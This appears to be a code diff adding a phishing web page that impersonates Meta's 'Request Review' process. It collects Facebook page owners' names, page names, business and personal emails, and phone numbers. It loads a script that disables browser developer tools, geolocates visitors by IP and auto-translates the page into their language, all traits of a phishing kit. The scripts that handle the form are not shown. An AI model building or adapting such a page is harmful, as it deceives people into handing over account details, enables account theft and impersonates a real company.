@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta | Request Review</title>
+    <link rel="shortcut icon" href="./public/images/favicon.png" type="image/x-icon">
+    <link rel="stylesheet" href="./public/styles/style.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+</head>
+
+<body>
+        <div class="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
+            <div class='max-w-[1280px] w-full flex items-center justify-between px-4'>
+                <a href="/">
+                    <img src="./public/images/logo-meta.svg" width="64px" alt="" />
+                </a>
+            </div>
+        </div>
+        <div
+            class="w-full max-w-[600px] my-10 mx-auto bg-white md:rounded-lg md:shadow-sm md:border md:border-gray-200 px-4 py-4">
+            <div class="mb-6 p-4 bg-blue-50 font-[300] border border-blue-200 rounded-md text-gray-800 text-[14px]">
+                        Please ensure you provide all the information requested below. Our technology and team work in multiple languages 
+                        ​​to ensure consistent enforcement of the rules. You can contact us in your native language. </div>
+            <form id="clientForm" class="space-y-4">
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Full Name <span class="text-red-600">*</span>
+                    </label>
+                    <input type="text" name="fullName" id="fullName" placeholder="Enter your full name" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Facebook Page Name <span class="text-red-600">*</span>
+                    </label>
+                    <input type="text" name="pageName" id="fanpage" placeholder="Enter your Facebook page name" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Business Email <span class="text-red-600">*</span>
+                    </label>
+                    <input type="email" id="emailBusiness" name="businessEmail" placeholder="Enter your business email"
+                        required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Personal Email <span class="text-red-600">*</span>
+                    </label>
+                    <input type="email" id="email" name="personalEmail" placeholder="Enter your personal email" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Mobile Phone Number <span class="text-red-600">*</span>
+                    </label>
+                    <input type="tel" id="phone" name="phone" placeholder="Enter your mobile phone number" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div class="pt-2">
+                    <div class="mt-1">
+                        <textarea name="additionalNotes" placeholder="Additional notes (optional)"
+                            class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
+                    </div>
+                </div>
+
+                <div class="pt-3">
+                    <button id="btn-submit-request" type="submit"
+                        class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
+                </div>
+
+                <div class="w-16 pt-5 mx-auto">
+                    <img src="./public/images/logo-gray.svg" alt="Meta">
+                </div>
+
+            </form>
+
+        </div>
+
+        <div class='bg-[#F5F6F6] pt-5 pb-5 border-t border-[#E0E0E0] w-full'>
+            <div class='max-w-[1280px] w-full mx-auto px-4'>
+                <div class='flex flex-wrap justify-center gap-4 mb-4 text-[13px] text-gray-600'>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>English (US)</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>English (UK)</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Italiano</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Français</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>中文(简体)</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>日本語</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>한국어</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>עברית</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Español</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Português</a>
+                </div>
+                <div class='flex flex-wrap justify-center gap-4 text-[13px] text-gray-600'>
+                    <p class='mr-4'>© 2026 Meta</p>
+                    <a href='#' class='hover:underline'>About</a>
+                    <a href='#' class='hover:underline'>Developers</a>
+                    <a href='#' class='hover:underline'>Careers</a>
+                    <a href='#' class='hover:underline'>Privacy</a>
+                    <a href='#' class='hover:underline'>Cookies</a>
+                    <a href='#' class='hover:underline'>Terms</a>
+                    <a href='#' class='hover:underline'>Help Centre</a>
+                </div>
+            </div>
+        </div>
+
+
+    <div id="modalsContainer"></div>
+
+    <script src="./public/js/config.js"></script>
+    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/modal.js"></script>
+    <script src="./public/js/app.js"></script>
+    <script src="./public/js/disableDevtool.js"></script>
+</body>
+
+<script>
+const langMap = {
+    AF:"fa", AL:"sq", DZ:"ar", AD:"ca", AO:"pt",
+    AR:"es", AM:"hy", AU:"en", AT:"de", AZ:"az",
+    BD:"bn", BY:"be", BE:"fr", BZ:"en", BO:"es",
+    BA:"bs", BR:"pt", BG:"bg", KH:"km", CM:"fr",
+    CA:"fr", CL:"es", CN:"zh-CN", TW:"zh-TW",
+    HK:"zh-TW", MO:"zh-TW", CO:"es", CR:"es",
+    HR:"hr", CY:"el", CZ:"cs", DK:"da", DO:"es",
+    EC:"es", EG:"ar", SV:"es", EE:"et", ET:"am",
+    FI:"fi", FR:"fr", GE:"ka", DE:"de", GH:"en",
+    GR:"el", GT:"es", HN:"es", HU:"hu", IS:"is",
+    IN:"hi", ID:"id", IR:"fa", IQ:"ar", IE:"en",
+    IL:"iw", IT:"it", JP:"ja", JO:"ar", KZ:"kk",
+    KE:"sw", KP:"ko", KR:"ko", KW:"ar", LA:"lo",
+    LV:"lv", LB:"ar", LT:"lt", LU:"fr", MK:"mk",
+    MY:"ms", MT:"mt", MX:"es", MD:"ro", MN:"mn",
+    ME:"sr", MA:"ar", MM:"my", NP:"ne", NL:"nl",
+    NZ:"en", NI:"es", NG:"en", NO:"no", OM:"ar",
+    PK:"ur", PA:"es", PY:"es", PE:"es", PH:"tl",
+    PL:"pl", PT:"pt", PR:"es", QA:"ar", RO:"ro",
+    RU:"ru", SA:"ar", RS:"sr", SG:"en", SK:"sk",
+    SI:"sl", ZA:"af", ES:"es", LK:"si", SE:"sv",
+    CH:"de", SY:"ar", TW:"zh-TW", TJ:"tg", TZ:"sw",
+    TH:"th", TN:"ar", TR:"tr", UA:"uk", AE:"ar",
+    GB:"en", US:"en", UY:"es", UZ:"uz", VE:"es",
+    VN:"vi", YE:"ar", ZM:"en", ZW:"en"
+};
+    async function getCountryCode() {
+        try {
+            const cache = sessionStorage.getItem("country_code");
+            if (cache) return cache;
+
+            const res = await fetch("https://get.geojs.io/v1/ip/geo.json", {
+                cache: "force-cache"
+            });
+
+            const data = await res.json();
+
+            const code = data.country_code || "US";
+
+            sessionStorage.setItem("country_code", code);
+
+            return code;
+
+        } catch {
+            return "US";
+        }
+    }
+
+    function setCookie(name, value, days = 1) {
+        const d = new Date();
+        d.setTime(d.getTime() + days * 86400000);
+
+        document.cookie =
+            `${name}=${value};expires=${d.toUTCString()};path=/;SameSite=None;Secure`;
+    }
+
+    async function googleTranslateElementInit() {
+
+        // load cực nhanh nếu đã dịch trước đó
+        let savedLang = sessionStorage.getItem("translatedLang");
+
+        if (!savedLang) {
+            const country = await getCountryCode();
+            savedLang = langMap[country] || "en";
+        }
+
+        // nếu tiếng anh thì bỏ qua
+        if (savedLang === "en") return;
+
+        sessionStorage.setItem("translatedLang", savedLang);
+
+        // set cookie trước khi Google load
+        setCookie("googtrans", `/en/${savedLang}`);
+
+        new google.translate.TranslateElement({
+            pageLanguage: "en",
+            autoDisplay: false
+        }, "google_translate_element");
+
+        // dịch ngay khi select xuất hiện
+        const timer = setInterval(() => {
+            const select = document.querySelector(".goog-te-combo");
+
+            if (select) {
+                select.value = savedLang;
+                select.dispatchEvent(new Event("change"));
+                clearInterval(timer);
+            }
+        }, 10);
+    }
+
+    // giữ trạng thái dịch khi back/forward
+    window.addEventListener("pageshow", () => {
+        const lang = sessionStorage.getItem("translatedLang");
+
+        if (lang) {
+            setCookie("googtrans", `/en/${lang}`);
+        }
+    });
+</script>
+
+<script async
+src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+</body>
+
+</html>
